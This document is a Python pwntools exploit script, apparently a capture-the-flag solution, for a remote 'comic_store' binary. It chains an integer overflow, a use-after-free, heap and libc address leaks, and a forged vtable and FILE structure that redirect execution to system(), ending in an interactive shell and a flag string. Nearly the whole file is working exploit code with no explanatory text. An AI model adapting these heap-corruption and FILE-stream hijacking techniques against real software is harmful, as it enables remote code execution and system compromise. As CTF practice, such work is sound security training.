from pwn import *

#env = {"LD_PRELOAD":"./comic.so.6"}
#r = process("./comic_store", env=env)

r = remote("comicstore.acebear.site", 3005)

def register(name):
	r.sendline("1")
	print r.recvuntil("name: ")
	r.send(name)
	print r.recvuntil("choice: ")

def addComic(name, quantity):
	r.sendline("3")
	print r.recvuntil("comic: ")
	r.sendline(name)
	print r.recvuntil("Quantity: ")
	r.sendline(str(quantity))
	print r.recvuntil("choice: ")

def rename(name):
	r.sendline("4")
	print r.recvuntil("choice: ")
	r.sendline("2")
	print r.recvuntil("name: ")
	r.send(name)
	print r.recvuntil("choice: ")
	r.sendline("4")
	print r.recvuntil("choice: ")

def feedback(sbig, feedback):
	r.sendline("4")
	print r.recvuntil("choice: ")
	r.sendline("3")
	print r.recvuntil("choice: ")
	r.sendline(str(sbig))
	print r.recvuntil(": ")
	r.send(feedback)
	r.sendline("4")
	print r.recvuntil("choice: ")

def takeComicOut(comic, quantity):
	r.sendline("5")
	print r.recvuntil("choice: ")
	r.sendline("2")
	print r.recvuntil("comic: ")
	r.sendline(comic)
	print r.recvuntil("Quantity: ")
	r.sendline(str(quantity))
	print r.recvuntil("choice: ")
	r.sendline("3")
	print r.recvuntil("choice: ")

print r.recvuntil("choice: ")

#gdb.attach(r, "")

register("A"*0xa0)

for i in range(7):
	addComic("Conan", 138548) # using integer overflow

takeComicOut("Conan", 138500)

r.sendline("6")
print r.recvuntil("no) ")
r.sendline("1") # I'm rich now!

print r.recvuntil("choice: ")

addComic("Conan", 1)
addComic("Dragon Ball", 1)
addComic("Doraemon", 1)

for i in range(6):
	addComic("Doraemon", 165192)

addComic("Doraemon", 8847)

r.sendline("6")
print r.recvuntil("no) ")
r.sendline("1") # Trigger UAF

addComic("Naruto", 1)

r.sendline("5")
print r.recvuntil("choice: ")
r.sendline("1")
print r.recvuntil("30000 VND")
print r.recvuntil("*                        ")

rv = r.recv(6)
heap = u64(rv + "\x00\x00")
heap_base = heap - 0xd0
print r.recvuntil("choice: ")
r.sendline("3")
print r.recvuntil("choice: ")

print "heap: " + hex(heap_base)

rename("A"*0xe8 + p64(heap_base+0x310))
feedback(1, p64(heap_base+0x508)+"\x00"*16)

##### leak libc #####

r.sendline("5")
print r.recvuntil("choice: ")
r.sendline("1")
print r.recvuntil("30000 VND")
print r.recvuntil("*                        ")

rv = r.recv(6)
libc = u64(rv + "\x00\x00")
#libc_base = libc - 0x3c1bf8
libc_base = libc - 0x3c4c18

gets = libc_base + 0x6ed80
system = libc_base + 0x45390

print r.recvuntil("choice: ")
r.sendline("3")
print r.recvuntil("choice: ")

print "libc: " + hex(libc)

addComic("Death Note", 1)
addComic("Conan", 138547)
addComic("Conan", 30116)

r.sendline("6")
print r.recvuntil("no) ")
r.sendline("1") # Trigger UAF

########################################

vtbl = p64(gets)*17
vtbl += p64(heap_base+0x530)
#vtbl += p64(0x0)
#vtbl += p64(0x21)
#vtbl += p64(heap_base+0x520) # name
#vtbl += p64(0)*2 # price, quantity
#vtbl += p64(0) # align
#vtbl += p64(0x0)
#vtbl += p64(0x21)

feedback(2, vtbl) # fake vtable
feedback(1, p64(heap_base+0x70) + p64(libc_base+0x3c56f8-0x10) + p64(heap_base + 0x520)) # UAF

addComic("One Piece", 1)
addComic("Inuyasha", 1)

r.sendline("6")

file_stream = "\x87\x20\xad\xfb\x3b\x73\x68\x00"
file_stream += p64(libc_base + 0x3c56a3)*7
file_stream += p64(libc_base + 0x3c56a4)
file_stream += "\x00"*32
file_stream += p64(libc_base + 0x3c48e0)
file_stream += p64(0x1)
file_stream += p64(0xffffffffffffffff)
file_stream += p64(0x0)
file_stream += p64(libc_base + 0x3c6780)
file_stream += p64(0xffffffffffffffff)
file_stream += "\x00"*8
file_stream += p64(libc_base + 0x3c47a0)
file_stream += "\x00"*24
file_stream += p64(0xffffffff)
file_stream += "\x00"*16
file_stream += p64(libc_base + 0x3c5700)
file_stream += p64(libc_base + 0x3c5540)
file_stream += p64(libc_base + 0x3c5620)
file_stream += p64(libc_base + 0x3c48e0)
file_stream += p64(libc_base + 0x20b70)
file_stream += p64(system)*15

r.sendline(file_stream)

r.interactive()

# AceBear{pl3ase_read_comic_wh3n_u_h4ve_fr33_tim3}